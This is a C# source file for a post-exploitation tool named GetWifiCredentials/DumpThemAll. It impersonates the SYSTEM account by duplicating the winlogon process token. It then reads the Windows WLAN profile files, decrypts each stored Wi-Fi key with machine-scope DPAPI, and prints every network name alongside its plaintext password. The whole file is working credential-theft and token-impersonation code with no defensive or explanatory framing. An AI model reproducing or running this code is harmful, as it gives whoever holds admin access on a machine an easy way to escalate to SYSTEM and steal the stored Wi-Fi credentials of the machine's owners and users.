using System;
using System.IO;
using System.Globalization;
using System.Security.Cryptography;
using System.Xml;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Diagnostics;

namespace GetWifiCredentials
{
    class DumpThemAll
    {

        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool OpenProcessToken(IntPtr ProcessHandle, int DesiredAccess, out IntPtr TokenHandle);

        [DllImport("advapi32", SetLastError = true)]
        public static extern bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, ref IntPtr DuplicateTokenHandle);

        [DllImport("advapi32", SetLastError = true)]
        public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

        [DllImport("kernel32", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);

        String[] interfaces;

        internal DumpThemAll()
        {
            interfaces = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Microsoft\Wlansvc\Profiles\Interfaces\"));
        }

        internal void GetThem()
        {
            Console.WriteLine("{0,-20} {1,-63}", "SSID", "PSK");
            Console.WriteLine("{0,-20} {1,-63}", "----", "---");

            XmlDocument doc = new XmlDocument();
            foreach (String inter in interfaces)
            {
                String[] files = Directory.GetFiles(inter);
                foreach (String file in files)
                {
                    doc.Load(file);
                    XmlNodeList name = doc.GetElementsByTagName("name");

                    XmlNodeList keys = doc.GetElementsByTagName("keyMaterial");
                    foreach (XmlNode key in keys)
                    {
                        try
                        {
                            Console.WriteLine("{0,-20} {1,-63}", name[0].InnerText, DPAPIDecrypt(key.InnerText));
                        }
                        catch
                        {
                            Console.WriteLine("{0,-20} {1,-63}", name[0].InnerText, "No PSK found");
                        }
                    }
                }
            }
        }

        internal static String DPAPIDecrypt(String input)
        {
            Char[] array = input.ToCharArray();
            Int32 hold;
            System.Text.StringBuilder test = new System.Text.StringBuilder();

            Byte[] inputBytes = new Byte[array.Length / 2];
            Int32 j = 0;
            for (Int32 i = 0; i < array.Length; i += 2)
            {
                String chars = String.Format("{0}{1}", array[i], array[i + 1]);
                if (Int32.TryParse(chars, NumberStyles.HexNumber, CultureInfo.InvariantCulture, out hold))
                {
                    inputBytes[j] = Convert.ToByte((char)hold);
                    j++;
                }
            }
            Byte[] outputBytes = ProtectedData.Unprotect(inputBytes, null, DataProtectionScope.LocalMachine);
            return System.Text.Encoding.ASCII.GetString(outputBytes);
        }
        static void Main(string[] args)
        {
            GetSystem();
            Console.WriteLine("[+] Successfully impersonated SYSTEM user\r\n\r\n");

            DumpThemAll gwp = new DumpThemAll();
            gwp.GetThem();
        }





        public static bool IsHighIntegrity()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static void GetSystem()
        {
            if (IsHighIntegrity())
            {
                IntPtr hToken = IntPtr.Zero;

                Process[] processes = Process.GetProcessesByName("winlogon");
                IntPtr handle = processes[0].Handle;

                bool success = OpenProcessToken(handle, 0x0002, out hToken);

                IntPtr hDupToken = IntPtr.Zero;
                success = DuplicateToken(hToken, 2, ref hDupToken);

                success = ImpersonateLoggedOnUser(hDupToken);

                CloseHandle(hToken);
                CloseHandle(hDupToken);

            }
        }


    }
}